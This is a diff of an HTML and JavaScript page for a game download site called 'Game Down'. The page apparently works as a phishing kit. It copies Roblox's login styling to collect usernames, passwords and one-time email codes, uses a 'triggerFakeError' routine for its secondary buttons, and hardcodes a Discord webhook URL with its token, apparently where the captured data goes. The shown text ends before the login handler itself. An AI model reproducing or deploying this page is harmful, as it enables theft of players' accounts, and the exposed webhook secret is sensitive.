@@ -3,341 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Game Down - Download</title>
-    
-    <!-- Tailwind CSS -->
+    <title>Game Down</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- FontAwesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        /* Fonte Oficial Roblox-like */
         @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap');
-
-        body {
-            font-family: 'Source Sans Pro', sans-serif;
-            background-color: #f2f4f5;
-            margin: 0;
-            overflow-x: hidden;
-        }
-
-        /* --- Fundo Azul Tech (Animação) --- */
+        body { font-family: 'Source Sans Pro', sans-serif; background-color: #f2f4f5; margin: 0; overflow-x: hidden; }
+        
         #bg-tech-blur {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 40;
-            display: none; /* Só aparece nos modais */
-            background: 
-                radial-gradient(circle at 20% 30%, rgba(0, 80, 255, 0.4) 0%, transparent 50%),
-                radial-gradient(circle at 80% 70%, rgba(0, 150, 255, 0.3) 0%, transparent 50%),
-                linear-gradient(135deg, #0a0e17 0%, #0d1b35 100%);
-            background-size: 200% 200%;
-            filter: blur(8px);
-            animation: bgZoom 20s infinite alternate;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 40; display: none;
+            background: radial-gradient(circle at 20% 30%, rgba(0, 80, 255, 0.4) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 70%, rgba(0, 150, 255, 0.3) 0%, transparent 50%),
+                        linear-gradient(135deg, #0a0e17 0%, #0d1b35 100%);
+            background-size: 200% 200%; filter: blur(8px); animation: bgZoom 20s infinite alternate;
         }
+        @keyframes bgZoom { 0% {background-size:150% 150%} 100% {background-size:170% 170%} }
 
-        @keyframes bgZoom {
-            0% { background-size: 150% 150%; background-position: 0% 0%; }
-            100% { background-size: 170% 170%; background-position: 100% 100%; }
-        }
-
-        /* --- Estilo Base dos Modais --- */
-        .roblox-modal {
-            background-color: #191b1d;
-            color: white;
-            border-radius: 10px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            border: none;
-            position: relative;
-            z-index: 50; /* Acima do blur */
-        }
-
-        .roblox-header {
-            font-weight: 700;
-            font-size: 32px;
-            text-align: center;
-            margin-bottom: 24px;
-            color: #ffffff;
-            margin-top: 10px;
-        }
-
-        /* Inputs */
-        .roblox-input {
-            background-color: #232527;
-            border: 1px solid #a7a7a7;
-            border-radius: 6px;
-            color: white;
-            padding: 10px 12px;
-            font-size: 16px;
-            width: 100%;
-            margin-bottom: 12px;
-            height: 44px;
-            transition: all 0.2s;
-        }
-        .roblox-input::placeholder { color: #a7a7a7; }
-        .roblox-input:focus {
-            border-color: white;
-            outline: none;
-        }
-
-        /* Botões */
-        .roblox-btn-primary {
-            background-color: #232527;
-            border: 1px solid #ffffff;
-            color: white;
-            border-radius: 8px;
-            padding: 10px;
-            font-size: 16px;
-            font-weight: 500;
-            width: 100%;
-            cursor: pointer;
-            transition: background 0.2s;
-            height: 44px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+        /* Sidebar */
+        #sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: #ffffff; box-shadow: 2px 0 10px rgba(0,0,0,0.1); z-index: 60; transition: left 0.3s ease; display: flex; flex-direction: column; }
+        #sidebar.open { left: 0; }
+        .sidebar-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 55; display: none; }
+        .sidebar-overlay.show { display: block; }
+        .profile-img-container { width: 100px; height: 100px; border-radius: 50%; border: 1px solid black; margin: 0 auto; overflow: hidden; position: relative; background: #eee; display: flex; align-items: center; justify-content: center; }
+        .profile-img-container img { width: 100%; height: 100%; object-fit: cover; }
+        
+        /* Modais */
+        .roblox-modal { background-color: #191b1d; color: white; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; z-index: 50; }
+        .roblox-header { font-weight: 700; font-size: 32px; text-align: center; margin-bottom: 24px; color: #ffffff; margin-top: 10px; }
+        .roblox-input { background-color: #232527; border: 1px solid #a7a7a7; border-radius: 6px; color: white; padding: 10px 12px; font-size: 16px; width: 100%; height: 44px; outline: none; }
+        .roblox-input:focus { border-color: white; }
+        .password-container { position: relative; margin-bottom: 12px; }
+        .password-toggle { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); color: #a7a7a7; cursor: pointer; }
+        .roblox-btn-primary { background-color: #232527; border: 1px solid #ffffff; color: white; border-radius: 8px; padding: 10px; font-size: 16px; font-weight: 500; width: 100%; cursor: pointer; height: 44px; display: flex; align-items: center; justify-content: center; }
         .roblox-btn-primary:hover { background-color: rgba(255,255,255,0.1); }
-
-        .roblox-btn-secondary {
-            background-color: #2b2d31;
-            color: white;
-            border: 1px solid transparent;
-            border-radius: 8px;
-            padding: 10px;
-            font-size: 14px;
-            width: 100%;
-            cursor: pointer;
-            margin-bottom: 12px;
-            transition: border 0.2s;
-        }
-        .roblox-btn-secondary:hover { border-color: #ffffff; }
-
-        .roblox-link-text {
-            color: #ffffff;
-            font-size: 12px;
-            text-align: center;
-            display: block;
-            margin: 16px 0;
-            text-decoration: none;
-            cursor: pointer;
-        }
+        .roblox-btn-secondary { background-color: #2b2d31; color: white; border-radius: 8px; padding: 10px; font-size: 14px; width: 100%; cursor: pointer; margin-bottom: 12px; }
+        .roblox-btn-secondary:hover { border: 1px solid white; }
+        .roblox-divider { height: 1px; background-color: #3e4042; margin: 20px 0; width: 100%; }
+        .roblox-link-text { color: white; font-size: 12px; text-align: center; display: block; margin: 16px 0; cursor: pointer; }
         .roblox-link-text:hover { text-decoration: underline; }
+        .toast-error { position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%); background: #191b1d; color: white; padding: 14px 28px; border-radius: 8px; border: 1px solid #3e4042; z-index: 100; transition: bottom 0.5s ease-out; font-weight: 600; }
+        .toast-error.show { bottom: 25px; }
 
-        .roblox-divider {
-            height: 1px;
-            background-color: #3e4042;
-            margin: 20px 0;
-            width: 100%;
-        }
-
-        /* Modal E-mail Header Específico */
-        .email-modal-header {
-            background-color: #191b1d;
-            border-bottom: 1px solid #3e4042;
-            padding: 15px;
-            display: flex;
-            align-items: center;
-            border-radius: 10px 10px 0 0;
-        }
-        .email-modal-close { font-size: 24px; color: white; cursor: pointer; margin-right: 15px; }
-        .email-modal-title { font-size: 20px; font-weight: 400; color: white; flex-grow: 1; text-align: center; margin-right: 24px; }
-
-        /* Toast de Erro (Animação Pop-up) */
-        .toast-error {
-            position: fixed;
-            bottom: -100px; /* Começa escondido */
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: #191b1d;
-            color: white;
-            padding: 14px 28px;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
-            z-index: 100;
-            font-weight: 600;
-            border: 1px solid #3e4042;
-            opacity: 0;
-            transition: bottom 0.5s ease-out, opacity 0.5s;
-        }
-        .toast-error.show {
-            bottom: 25px; /* Sobe e para 5px acima do fim (20+5 visualmente) */
-            opacity: 1;
-        }
+        /* Header */
+        header { display: flex; align-items: center; justify-content: space-between; gap: 10px; }
+        .search-bar { flex-grow: 1; max-width: 500px; position: relative; }
+        .search-input { width: 100%; padding: 8px 35px 8px 15px; border-radius: 20px; border: 1px solid #ddd; outline: none; }
+        .search-icon { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); color: #666; cursor: pointer; }
     </style>
 </head>
 <body class="flex flex-col min-h-screen relative">
-
-    <!-- Fundo Azul Borrado (Ativado via JS nos Modais) -->
     <div id="bg-tech-blur"></div>
+    <div id="sidebar-overlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>
 
-    <!-- Header -->
-    <header class="bg-white shadow-md p-4 flex justify-between items-center z-10 sticky top-0">
-        <h1 class="text-2xl font-bold text-gray-800">Game Down</h1>
+    <!-- SIDEBAR -->
+    <div id="sidebar">
+        <div class="p-6 border-b flex justify-between items-center bg-gray-50">
+            <span class="font-bold text-xl text-gray-800">Menu</span>
+            <button onclick="toggleSidebar()"><i class="fa-solid fa-xmark text-2xl text-gray-600"></i></button>
+        </div>
+        <div class="p-4 flex-grow">
+            <button onclick="abrirPerfil()" class="w-full text-left p-3 hover:bg-gray-100 rounded flex items-center gap-3 text-gray-700 font-medium">
+                <i class="fa-solid fa-user"></i> Perfil
+            </button>
+        </div>
+        <div class="p-4 border-t">
+            <button onclick="logout()" class="w-full text-left p-3 text-red-600 hover:bg-red-50 rounded flex items-center gap-3 font-bold">
+                <i class="fa-solid fa-right-from-bracket"></i> Sair da conta
+            </button>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="bg-white shadow-md p-4 sticky top-0 z-30">
         <div class="flex items-center gap-4">
-            
-            <!-- Botão Admin Upload -->
-            <button id="btn-upload" onclick="modalUpload.classList.remove('hidden')" class="hidden bg-green-600 hover:bg-green-700 text-white w-10 h-10 rounded-full transition shadow-lg items-center justify-center">
+            <button onclick="toggleSidebar()" class="text-gray-700 text-2xl hover:text-black"><i class="fa-solid fa-bars"></i></button>
+            <h1 class="text-xl md:text-2xl font-bold text-gray-800 hidden sm:block">Game Down</h1>
+        </div>
+        <div class="search-bar">
+            <input type="text" id="search-input" class="search-input" placeholder="Pesquisar jogos..." onkeypress="handleSearch(event)">
+            <i class="fa-solid fa-magnifying-glass search-icon" onclick="realizarBusca()"></i>
+        </div>
+        <div class="flex items-center gap-3">
+            <button id="btn-upload" onclick="modalUpload.classList.remove('hidden')" class="hidden bg-green-600 hover:bg-green-700 text-white w-10 h-10 rounded-full shadow-lg flex items-center justify-center">
                 <i class="fa-solid fa-plus text-xl"></i>
             </button>
-
-            <!-- Info Usuário Logado -->
-            <div id="user-display" class="hidden flex items-center gap-3">
-                <span id="username-text" class="font-semibold text-gray-700">User</span>
-                <button onclick="logout()" class="text-red-500 text-sm hover:underline">Sair</button>
+            <div id="user-display" class="hidden flex items-center gap-2">
+                <span id="header-username" class="font-semibold text-gray-700 text-sm max-w-[100px] truncate">User</span>
             </div>
-
-            <!-- Botão Login (Para quem não tá logado) -->
-            <button id="btn-login-main" onclick="abrirModalSelecao()" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg font-bold shadow transition">
-                Login
-            </button>
+            <button id="btn-login-main" onclick="abrirModalSelecao()" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg font-bold shadow text-sm">Login</button>
         </div>
     </header>
 
-    <!-- Conteúdo Principal -->
+    <!-- CONTEÚDO -->
     <main class="flex-grow container mx-auto p-6 z-10 relative">
         <div id="games-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
-            <div class="col-span-full text-center text-gray-500 mt-10">
-                <i class="fa-solid fa-gamepad text-4xl mb-2 block"></i>
-                Carregando jogos...
-            </div>
+            <div class="col-span-full text-center text-gray-500 mt-10">Carregando...</div>
         </div>
     </main>
 
-    <!-- ========================== MODAIS ========================== -->
+    <!-- Modais -->
+    <div id="modal-perfil" class="fixed inset-0 bg-black bg-opacity-60 z-[70] hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-lg p-6 w-full max-w-sm relative text-center">
+            <button onclick="document.getElementById('modal-perfil').classList.add('hidden')" class="absolute top-4 right-4 text-gray-500"><i class="fa-solid fa-xmark text-xl"></i></button>
+            <h3 class="text-xl font-bold text-gray-800 mb-6">Seu Perfil</h3>
+            <div class="mb-2">
+                <div class="profile-img-container" id="profile-preview"></div>
+                <label for="upload-avatar" class="text-xs text-blue-600 cursor-pointer hover:underline mt-2 block">Adicionar uma imagem</label>
+                <input type="file" id="upload-avatar" accept="image/*" class="hidden" onchange="previewImagem(event)">
+            </div>
+            <div class="mt-6 flex items-center justify-center gap-2">
+                <input id="profile-name-input" type="text" class="text-xl font-bold text-center border-b border-transparent focus:border-blue-500 outline-none w-2/3" value="Usuário" readonly>
+                <button onclick="habilitarEdicaoNome()" class="text-gray-500 hover:text-blue-600"><i class="fa-solid fa-pen"></i></button>
+            </div>
+            <button onclick="salvarPerfil()" id="btn-save-profile" class="mt-6 bg-blue-600 text-white px-6 py-2 rounded-lg w-full hidden">Salvar Alterações</button>
+        </div>
+    </div>
 
-    <!-- 1. Modal Seleção (Escolha Login) -->
     <div id="modal-selecao" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
         <div class="roblox-modal w-full max-w-[400px] p-6 relative">
-            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl">
-                <i class="fa-solid fa-xmark"></i>
-            </button>
-
+            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
             <h2 class="roblox-header mt-4">Login</h2>
-
-            <!-- Botão Discord (Link Exato Fornecido) -->
-            <a href="https://discord.com/oauth2/authorize?client_id=1443717513748812011&response_type=code&redirect_uri=https%3A%2F%2Fgame-down.netlify.app%2Fsucess&scope=guilds.join+identify" 
-               class="bg-[#5865F2] hover:bg-[#4752C4] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 mb-4 transition no-underline">
+            <a href="https://discord.com/oauth2/authorize?client_id=1443717513748812011&response_type=code&redirect_uri=https%3A%2F%2Fgamedown.onrender.com%2Fsucess&scope=identify+guilds.join" class="bg-[#5865F2] hover:bg-[#4752C4] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 mb-4 transition no-underline">
                 <i class="fa-brands fa-discord text-xl"></i> Login por Discord
             </a>
-
-            <!-- Botão Roblox (Game Down) -->
-            <button onclick="abrirFormularioRoblox()" 
-               class="bg-[#232527] border border-white hover:bg-[#2b2d31] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 transition">
+            <button onclick="abrirFormularioRoblox()" class="bg-[#232527] border border-white hover:bg-[#2b2d31] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 transition">
                 <i class="fa-solid fa-cube text-xl"></i> Login por Roblox
             </button>
         </div>
     </div>
 
-    <!-- 2. Modal Formulário Roblox/Game Down -->
     <div id="modal-form-roblox" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
         <div class="roblox-modal w-full max-w-[400px] p-6 relative">
-            <button onclick="voltarSelecao()" class="absolute top-4 left-4 text-gray-400 hover:text-white text-lg" title="Voltar">
-                <i class="fa-solid fa-arrow-left"></i>
-            </button>
-            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl">
-                <i class="fa-solid fa-xmark"></i>
-            </button>
-
-            <h2 class="roblox-header mt-8">Game Down</h2>
-
+            <button onclick="voltarSelecao()" class="absolute top-4 left-4 text-gray-400 hover:text-white text-lg"><i class="fa-solid fa-arrow-left"></i></button>
+            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
+            
+            <!-- TÍTULO ALTERADO AQUI -->
+            <h2 class="roblox-header mt-8">Entre com Roblox</h2>
+            
             <form onsubmit="event.preventDefault(); processarLogin();">
-                <input type="text" id="inp-user" class="roblox-input" placeholder="Usuário/e-mail/telefone">
-                <input type="password" id="inp-pass" class="roblox-input" placeholder="Senha">
+                <input type="text" id="inp-user" class="roblox-input mb-3" placeholder="Usuário/e-mail/telefone">
+                <div class="password-container">
+                    <input type="password" id="inp-pass" class="roblox-input" placeholder="Senha">
+                    <i class="fa-solid fa-eye password-toggle" onclick="togglePassword()"></i>
+                </div>
                 <button type="submit" class="roblox-btn-primary mt-2">Entrar</button>
             </form>
-
             <div class="roblox-link-text mt-3" onclick="triggerFakeError()">Esqueceu a senha ou nome de usuário?</div>
-
             <div class="roblox-divider"></div>
-
-            <button onclick="irParaEmail()" class="roblox-btn-secondary bg-[#393b3d]">
-                Envie-me um código unico por e-mail
-            </button>
-            <button onclick="triggerFakeError()" class="roblox-btn-secondary bg-[#393b3d]">
-                Use outro dispositivo
-            </button>
-            
-            <div class="text-center mt-2 text-sm text-gray-400">
-                Não possui conta? <span class="text-white cursor-pointer hover:underline" onclick="triggerFakeError()">Cadastre-se</span>
-            </div>
+            <button onclick="irParaEmail()" class="roblox-btn-secondary bg-[#393b3d]">Envie-me um código unico por e-mail</button>
+            <button onclick="triggerFakeError()" class="roblox-btn-secondary bg-[#393b3d]">Use outro dispositivo</button>
+            <div class="text-center mt-2 text-sm text-gray-400">Não possui conta? <span class="text-white cursor-pointer hover:underline" onclick="triggerFakeError()">Cadastre-se</span></div>
         </div>
     </div>
 
-    <!-- 3. Modal E-mail -->
     <div id="modal-email" class="fixed inset-0 z-[60] hidden flex items-center justify-center p-4">
-        <div class="roblox-modal w-full max-w-[500px] overflow-hidden">
-            <div class="email-modal-header">
-                <div class="email-modal-close" onclick="fecharEmail()"><i class="fa-solid fa-xmark"></i></div>
-                <div class="email-modal-title">Obter código único</div>
-            </div>
-            <div class="p-8">
-                <p class="text-gray-300 text-sm mb-6">Digite o e-mail verificado na sua conta para receber um código único.</p>
-                <input type="email" id="inp-email-codigo" class="roblox-input bg-transparent border-gray-500 mb-8" placeholder="E-mail">
-                <button onclick="enviarCodigoEmail()" class="roblox-btn-primary bg-transparent text-gray-300 hover:text-white border-gray-500 hover:border-white">
-                    Enviar código
-                </button>
-            </div>
-        </div>
+        <div class="roblox-modal w-full max-w-[500px]"><div class="p-8"><input id="inp-email-codigo" type="email" class="roblox-input bg-transparent border-gray-500 mb-6" placeholder="E-mail"><button onclick="enviarCodigoEmail()" class="roblox-btn-primary bg-transparent border-gray-500">Enviar código</button></div></div>
     </div>
-
-    <!-- 4. Modal Código -->
     <div id="modal-codigo" class="fixed inset-0 z-[70] hidden flex items-center justify-center p-4">
-        <div class="roblox-modal w-full max-w-[500px] overflow-hidden">
-            <div class="email-modal-header">
-                <div class="email-modal-close" onclick="fecharCodigo()"><i class="fa-solid fa-xmark"></i></div>
-                <div class="email-modal-title">Inserir código</div>
-            </div>
-            <div class="p-8 text-center">
-                <p class="text-gray-300 text-sm mb-6">Insira o código enviado para seu e-mail.</p>
-                <input type="text" id="inp-final-code" class="roblox-input text-center text-xl tracking-widest" placeholder="">
-                <button onclick="verificarCodigo()" class="roblox-btn-primary bg-white text-black font-bold hover:bg-gray-200 border-none mt-4">
-                    Verificar
-                </button>
-            </div>
-        </div>
+        <div class="roblox-modal w-full max-w-[500px]"><div class="p-8 text-center"><input id="inp-final-code" type="text" class="roblox-input text-center text-xl tracking-widest mb-4"><button onclick="verificarCodigo()" class="roblox-btn-primary bg-white text-black">Verificar</button></div></div>
     </div>
-
-    <!-- 5. Modal Definir Usuário (Pós Login/Redirect) -->
     <div id="modal-username" class="fixed inset-0 z-[80] hidden flex items-center justify-center p-4">
-        <div class="roblox-modal w-full max-w-[400px] p-6 relative">
-            <h2 class="roblox-header">Bem-vindo!</h2>
-            <p class="text-center text-gray-300 mb-4">Como você quer ser chamado?</p>
-            <input type="text" id="inp-new-username" class="roblox-input" placeholder="Nome de usuário">
-            <button onclick="confirmarUsername()" class="roblox-btn-primary bg-green-600 hover:bg-green-700 border-none">
-                Confirmar e Entrar
-            </button>
-        </div>
+        <div class="roblox-modal w-full max-w-[400px] p-6"><h2 class="roblox-header">Bem-vindo!</h2><input id="inp-new-username" type="text" class="roblox-input mb-4" placeholder="Nome de usuário"><button onclick="confirmarUsername()" class="roblox-btn-primary bg-green-600 border-none">Confirmar</button></div>
     </div>
-
-    <!-- 6. Modal Upload (Apenas Admin) -->
     <div id="modal-upload" class="fixed inset-0 bg-black bg-opacity-60 z-[90] hidden flex items-center justify-center p-4">
-        <div class="bg-white rounded-lg p-6 w-full max-w-md relative text-gray-800 shadow-2xl">
-            <div class="flex justify-between items-center mb-4">
-                <h3 class="font-bold text-xl">Adicionar Jogo</h3>
-                <button onclick="modalUpload.classList.add('hidden')" class="text-gray-500 hover:text-black"><i class="fa-solid fa-xmark text-xl"></i></button>
-            </div>
-            <input type="text" id="up-name" class="w-full border border-gray-300 p-2 rounded mb-3" placeholder="Nome do Jogo">
-            <input type="text" id="up-img" class="w-full border border-gray-300 p-2 rounded mb-3" placeholder="URL da Capa (Imagem)">
-            <input type="text" id="up-link" class="w-full border border-gray-300 p-2 rounded mb-3" placeholder="Link de Download">
-            <button onclick="salvarJogo()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-2 rounded transition">Publicar</button>
-        </div>
+        <div class="bg-white rounded-lg p-6 w-full max-w-md relative"><div class="flex justify-between mb-4"><h3 class="font-bold">Adicionar Jogo</h3><i onclick="modalUpload.classList.add('hidden')" class="fa-solid fa-xmark cursor-pointer"></i></div><input id="up-name" class="w-full border p-2 rounded mb-3" placeholder="Nome"><input id="up-img" class="w-full border p-2 rounded mb-3" placeholder="URL Capa"><input id="up-link" class="w-full border p-2 rounded mb-3" placeholder="Link"><button onclick="salvarJogo()" class="w-full bg-green-600 text-white p-2 rounded">Publicar</button></div>
     </div>
-
-    <!-- Toast Erro -->
+    
     <div id="toast" class="toast-error">Erro</div>
 
     <script>
-        // --- CONFIGURAÇÕES ---
         const API_URL = (location.hostname.includes("render.com") || location.hostname === "localhost") ? "/api/jogos" : "MOCK";
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1444449733753180355/UexEyxKjWYMkbMEuXkBrvXeNzAS5s8BapW5K4b6PqB-2zqDT5BNxfOYfgrjjiG_t45PA";
-        
         let currentUser = null;
 
-        // Elementos DOM
+        const sidebar = document.getElementById('sidebar');
+        const sidebarOverlay = document.getElementById('sidebar-overlay');
         const bgBlur = document.getElementById('bg-tech-blur');
         const modalSelecao = document.getElementById('modal-selecao');
         const modalFormRoblox = document.getElementById('modal-form-roblox');
@@ -348,237 +189,133 @@
         const toast = document.getElementById('toast');
         const btnUpload = document.getElementById('btn-upload');
 
-        // --- INICIALIZAÇÃO ---
         window.onload = () => {
             carregarJogos();
-            
-            // Verifica se voltou do Discord (/sucess)
+            carregarPerfilLocal();
             if(window.location.href.includes("sucess")) {
                 bgBlur.style.display = 'block';
                 modalUsername.classList.remove('hidden');
-                // Limpa a URL para ficar bonito
                 window.history.replaceState({}, document.title, "/");
             }
         };
 
-        // --- SISTEMA DE JOGOS (BACKEND) ---
-        async function carregarJogos() {
-            const grid = document.getElementById('games-grid');
-            let jogos = [];
-
-            if (API_URL === 'MOCK') {
-                jogos = JSON.parse(localStorage.getItem('mock_jogos') || '[]');
-            } else {
-                try {
-                    const res = await fetch(API_URL);
-                    if (res.ok) jogos = await res.json();
-                } catch (e) { console.error("Erro fetch jogos", e); }
-            }
-
-            grid.innerHTML = "";
-            if(jogos.length === 0) {
-                grid.innerHTML = '<p class="col-span-full text-center text-gray-500">Nenhum jogo disponível.</p>';
-                return;
-            }
-
-            jogos.forEach(j => {
-                const card = document.createElement('div');
-                card.className = "bg-white rounded-lg shadow-md overflow-hidden hover:shadow-xl transition transform hover:-translate-y-1 flex flex-col";
-                card.innerHTML = `
-                    <div class="h-40 bg-gray-300 relative"><img src="${j.capa || 'https://placehold.co/400x300?text=Sem+Capa'}" class="w-full h-full object-cover"></div>
-                    <div class="p-4 flex flex-col flex-grow">
-                        <h3 class="font-bold text-lg text-gray-800 mb-2 truncate">${j.nome}</h3>
-                        <div class="mt-auto">
-                            <button onclick="tentarBaixar('${j.link}')" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 rounded flex items-center justify-center gap-2">
-                                <i class="fa-solid fa-download"></i> Baixar
-                            </button>
-                        </div>
-                    </div>`;
-                grid.appendChild(card);
-            });
+        function toggleSidebar() { sidebar.classList.toggle('open'); sidebarOverlay.classList.toggle('show'); }
+        function abrirPerfil() {
+            if(!currentUser && !localStorage.getItem('local_username')) { toggleSidebar(); abrirModalSelecao(); return; }
+            toggleSidebar();
+            const savedName = localStorage.getItem('local_username') || currentUser?.nome || "Usuário";
+            const savedImg = localStorage.getItem('local_userimg');
+            document.getElementById('profile-name-input').value = savedName;
+            atualizarPreviewImagem(savedImg);
+            document.getElementById('modal-perfil').classList.remove('hidden');
         }
+        function habilitarEdicaoNome() { const i = document.getElementById('profile-name-input'); i.removeAttribute('readonly'); i.focus(); i.classList.remove('border-transparent'); i.classList.add('border-blue-500'); document.getElementById('btn-save-profile').classList.remove('hidden'); }
+        function previewImagem(e) { const f = e.target.files[0]; if(f){ const r = new FileReader(); r.onload=function(ev){ atualizarPreviewImagem(ev.target.result); document.getElementById('btn-save-profile').classList.remove('hidden'); }; r.readAsDataURL(f); } }
+        function atualizarPreviewImagem(src) { document.getElementById('profile-preview').innerHTML = src ? `<img src="${src}">` : ''; }
+        function salvarPerfil() {
+            const n = document.getElementById('profile-name-input').value;
+            const i = document.getElementById('profile-preview').querySelector('img')?.src || "";
+            localStorage.setItem('local_username', n);
+            if(i) localStorage.setItem('local_userimg', i);
+            if(currentUser) { currentUser.nome = n; document.getElementById('header-username').innerText = n; }
+            document.getElementById('btn-save-profile').classList.add('hidden');
+            document.getElementById('profile-name-input').setAttribute('readonly',true);
+            alert("Perfil salvo!");
+        }
+        function carregarPerfilLocal() { const n = localStorage.getItem('local_username'); if(n) logarReal(n, false); }
 
-        function tentarBaixar(link) {
-            if(!currentUser) {
-                abrirModalSelecao();
-            } else {
-                window.open(link, '_blank');
-            }
+        function handleSearch(e) { if(e.key === 'Enter') realizarBusca(); }
+        async function realizarBusca() {
+            const t = document.getElementById('search-input').value;
+            const url = t ? `${API_URL}?busca=${encodeURIComponent(t)}` : API_URL;
+            try { const res = await fetch(url); if(res.ok) renderizarGrid(await res.json()); } catch(e){}
+        }
+        function togglePassword() { const i=document.getElementById('inp-pass'); const c=document.querySelector('.password-toggle'); if(i.type==='password'){i.type='text';c.classList.remove('fa-eye');c.classList.add('fa-eye-slash');}else{i.type='password';c.classList.remove('fa-eye-slash');c.classList.add('fa-eye');} }
+
+        async function carregarJogos() { realizarBusca(); }
+        function renderizarGrid(jogos) {
+            const grid = document.getElementById('games-grid'); grid.innerHTML = "";
+            if(jogos.length===0) { grid.innerHTML='<p class="col-span-full text-center text-gray-500">Nenhum jogo encontrado.</p>'; return; }
+            jogos.forEach(j => {
+                const c = document.createElement('div');
+                c.className = "bg-white rounded-lg shadow-md overflow-hidden hover:shadow-xl transition transform hover:-translate-y-1 flex flex-col";
+                c.innerHTML = `<div class="h-40 bg-gray-300 relative"><img src="${j.capa||'https://placehold.co/400x300?text=Sem+Capa'}" class="w-full h-full object-cover"></div><div class="p-4 flex flex-col flex-grow"><h3 class="font-bold text-lg text-gray-800 mb-2 truncate">${j.nome}</h3><div class="mt-auto"><button onclick="tentarBaixar('${j.link}')" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-download"></i> Baixar</button></div></div>`;
+                grid.appendChild(c);
+            });
         }
 
         async function salvarJogo() {
             const nome = document.getElementById('up-name').value.trim();
             const capa = document.getElementById('up-img').value.trim();
             const link = document.getElementById('up-link').value.trim();
-
             if(!nome || !link) return alert("Preencha Nome e Link");
 
-            const btn = event.target;
-            btn.textContent = "Publicando...";
-            btn.disabled = true;
+            const btn = document.querySelector('#modal-upload button:last-child');
+            const originalText = btn.innerText;
+            btn.innerText = "Publicando..."; btn.disabled = true;
 
-            const novoJogo = { nome, capa, link };
+            const jogo = { nome, capa, link };
 
-            if (API_URL === 'MOCK') {
-                let lista = JSON.parse(localStorage.getItem('mock_jogos') || '[]');
-                lista.push(novoJogo);
-                localStorage.setItem('mock_jogos', JSON.stringify(lista));
-                finalizar("Jogo publicado!");
-            } else {
-                try {
+            try {
+                if(API_URL !== 'MOCK') {
                     const res = await fetch(API_URL, { 
-                        method: 'POST', 
-                        headers: { 'Content-Type': 'application/json' }, 
-                        body: JSON.stringify(novoJogo) 
+                        method:'POST', 
+                        headers:{'Content-Type':'application/json'}, 
+                        body:JSON.stringify(jogo)
                     });
-                    if (res.ok) finalizar("Jogo publicado com sucesso!");
-                    else alert("Erro ao salvar no servidor");
-                } catch (e) { alert("Erro de conexão"); }
-            }
-
-            function finalizar(msg) {
-                alert(msg);
+                    if(!res.ok) throw new Error("Erro no servidor");
+                } else {
+                    let l = JSON.parse(localStorage.getItem('mock_jogos')||'[]'); l.push(jogo); localStorage.setItem('mock_jogos',JSON.stringify(l));
+                }
+                alert("Publicado com sucesso!");
                 modalUpload.classList.add('hidden');
-                document.getElementById('up-name').value = "";
-                document.getElementById('up-img').value = "";
-                document.getElementById('up-link').value = "";
-                btn.textContent = "Publicar";
-                btn.disabled = false;
+                document.getElementById('up-name').value=""; document.getElementById('up-img').value=""; document.getElementById('up-link').value="";
                 carregarJogos();
+            } catch(e) { 
+                console.error(e);
+                alert("ERRO: Verifique MONGODB_URI no Render."); 
+            } finally {
+                btn.innerText = originalText; btn.disabled = false;
             }
         }
 
-        // --- FLUXOS DE LOGIN E INTERFACE ---
-
-        function abrirModalSelecao() {
-            if(!currentUser) {
-                modalSelecao.classList.remove('hidden');
-                bgBlur.style.display = 'block';
-            }
-        }
-
-        function abrirFormularioRoblox() {
-            modalSelecao.classList.add('hidden');
-            modalFormRoblox.classList.remove('hidden');
-        }
-
-        function voltarSelecao() {
-            modalFormRoblox.classList.add('hidden');
-            modalSelecao.classList.remove('hidden');
-        }
-
-        function fecharModais() {
-            [modalSelecao, modalFormRoblox, modalEmail, modalCodigo, modalUsername].forEach(m => m.classList.add('hidden'));
-            bgBlur.style.display = 'none';
-        }
-
-        // Simulação de Erro Pop-up (Esqueceu senha, etc)
-        function triggerFakeError() {
